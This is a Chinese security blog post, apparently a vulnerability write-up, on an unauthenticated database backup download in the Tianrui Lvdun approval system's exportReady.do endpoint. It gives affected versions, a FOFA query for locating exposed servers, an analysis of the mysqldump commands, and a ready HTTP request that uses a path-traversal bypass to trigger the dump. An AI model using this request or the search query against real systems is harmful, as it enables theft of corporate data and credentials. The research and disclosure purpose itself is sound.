---
title: "天锐绿盾审批系统 exportReady.do 数据库备份下载"
source: https://mrxn.net/jswz/trwfe-exportReady-data-leak.html
asset_dir: assets/天锐绿盾审批系统-exportready.do-数据库备份下载
---

# 天锐绿盾审批系统 exportReady.do 数据库备份下载

[Mrxn](https://mrxn.net/author/1)- 发表于2025/11/3 16:23
- 608浏览
- [0评论](#comment)
- 20分钟阅读

深入探索

软件

备份

信息安全

---

# 漏洞简介

天锐绿盾审批系统是一款专注于企业数据安全与合规管理的智能审批平台，深度融合文档加密、权限管控与流程自动化，为企业提供从文件创建、流转到归档的全生命周期安全管控。该系统的 `exportReady.do` 接口存在[数据库备份下载](https://mrxn.net/tag/data-leak)漏洞，未经授权的攻击者可以直接下载系统备份的数据库文件。这可能导致企业内部的敏感数据、用户凭证、业务信息等大量核心数据[泄露](https://mrxn.net/tag/data-leak)，对企业的信息安全造成严重威胁。

数据管理

# 影响版本

> 可通过访问 /trwfe/exports/config.ini 获取版本信息

V3.53.240913

V7.05.240904

# fofa语法

> app="TIPPAY-绿盾审批系统"

# 漏洞分析

先看`exportReady.do`的实现

[![天锐绿盾审批系统 exportReady.do 数据库备份下载](images/img-001-e7ecf8548546.webp)](https://image.mrxn.net/1d05491506c04f1ca54c307900eea1a8.webp)

跟进`configService.exportReady`

深入探索

安全研究报告

编程语言教程

安全认证考试

首先定义文件名的格式化时间部分以及`tempPath` 为应用根目录下的`exports`文件夹，

数据备份与恢复

[![天锐绿盾审批系统 exportReady.do 数据库备份下载](images/img-002-baa667f1a91c.webp)](https://image.mrxn.net/18fbb3776de44e0e8699c0433860add5.webp)

以及下面使用`mysqldump` 导出的数据库备份内容到各自定义的文件内

漏洞修复方案

深入探索

物流软件安全

安全工具开发

企业安全咨询

[![天锐绿盾审批系统 exportReady.do 数据库备份下载](images/img-003-bed1bbecba78.webp)](https://image.mrxn.net/266d4a16caf04972b5df3c6f2e72e651.webp)

这里如果后续有地方修改配置文件，还可以造成[命令注入](https://mrxn.net/tag/rce)漏洞的。

这三条`mysqldump`命令`dump`的内容分析如下

文件大小转换

**1.** `stringBuilder` **命令**

**分析：**

- `-h`、`-P`、`-u`、`-p`：指定连接数据库的 IP、端口、用户名和密码。
- `socket`：可能用于指定 Unix 套接字连接（如果 `socket` 变量包含套接字路径）。
- `--default-character-set=utf8`：指定默认字符集为 UTF-8。
- `" + (String)lists.get("datebaseName")`：指定要备份的数据库名称。
- `--ignore-table=activiti.ext_file_server` 等四个 `ignore-table` 参数：明确指定在备份时**忽略** `activiti` 数据库中的 `ext_file_server`、`ext_file_server_addr`、`ext_file_server_path` 和 `ext_config` 这四张表。
- `--hex-blob`：将二进制数据（如 BLOB 类型）以十六进制格式导出。

**结论：** 此命令会备份 `lists.get("datebaseName")` 指定的**整个数据库**，但会**排除** `activiti` 数据库中的 `ext_file_server`、`ext_file_server_addr`、`ext_file_server_path` 和 `ext_config` 这四张表的数据和结构。

计算机安全

**2.** `sb` **命令**

**分析：**

- `-u`、`-p`、`socket`：同上，用于连接数据库。
- `" + (String)lists.get("datebaseName") + " ext_config"`：明确指定要备份 `lists.get("datebaseName")` 数据库中的`ext_config` **表**。
- `--where="config_key!='system.version'"`：这是一个 `WHERE` 条件，表示只备份 `ext_config` 表中 `config_key` 字段**不等于** `'system.version'` 的行。

**结论：** 此命令会备份 `lists.get("datebaseName")` 数据库中的`ext_config` **表**，并且只备份该表中 `config_key` 字段值不为 `'system.version'` 的**数据行**。

**3.** `sbFun` **命令**

**分析：**

- `-u`、`-p`、`socket`：同上，用于连接数据库。
- `-R`：表示备份**存储过程和函数 (Routines)**。
- `-ndt`：这是一个组合参数，通常等同于 `-n` (no-create-info) 和 `-d` (no-data)。
  - `-n, --no-create-info`：不备份表的 `CREATE TABLE` 语句（即不备份表结构）。
  - `-d, --no-data`：不备份表的行数据。
  - （注：`mysqldump` 的 `-t` 选项也等同于 `-n`，所以 `-ndt` 实际效果是 `-n -d`）。
- `" + (String)lists.get("datebaseName")`：指定要备份的数据库名称。

**结论：** 此命令会备份 `lists.get("datebaseName")` 数据库中的**所有存储过程和函数**。它不会备份任何表的结构或数据。

网络安全

最后压缩后会将压缩后的文件地址（包括文件路径以及完整的文件名）响应在body

[![天锐绿盾审批系统 exportReady.do 数据库备份下载](images/img-004-27a92d024714.webp)](https://image.mrxn.net/d8567ad457c14aa6ae68ef84b173d7a3.webp)

# 漏洞复现

> 压缩的是整个根目录下的exports目录，因此如果目录存在其他文件也会一并压缩
>
> 数据管理

```
GET /trwfe/login.jsp/.%2e/config/exportReady.do HTTP/1.1
Host: trwfe.mrxn.net
```

[![天锐绿盾审批系统 exportReady.do 数据库备份下载](images/img-005-c4c765b98c63.webp)](https://image.mrxn.net/01b5003da82a4e118b6991ceacf80e94.webp)

然后下载即可获取到备份的数据库内容。

[![天锐绿盾审批系统 exportReady.do 数据库备份下载](images/img-006-18062801b612.webp)](https://image.mrxn.net/555c538fca74454d9f5b62398b9da8b6.webp)

- 标签：
- [#漏洞](https://mrxn.net/tag/%E6%BC%8F%E6%B4%9E)
- [#web安全](https://mrxn.net/tag/web%E5%AE%89%E5%85%A8)
- [#代码审计](https://mrxn.net/tag/%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1)
- [#Java](https://mrxn.net/tag/Java)
- [#0day](https://mrxn.net/tag/0day)
- [#泄露](https://mrxn.net/tag/%E6%B3%84%E9%9C%B2)

---

文章目录

- [1.漏洞简介](#toc-1-)
- [2.影响版本](#toc-2-)
- [3.fofa语法](#toc-3-)
- [4.漏洞分析](#toc-4-)
- [5.漏洞复现](#toc-5-)

  
  

![](data:image/png;base64,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)

手机扫码阅读
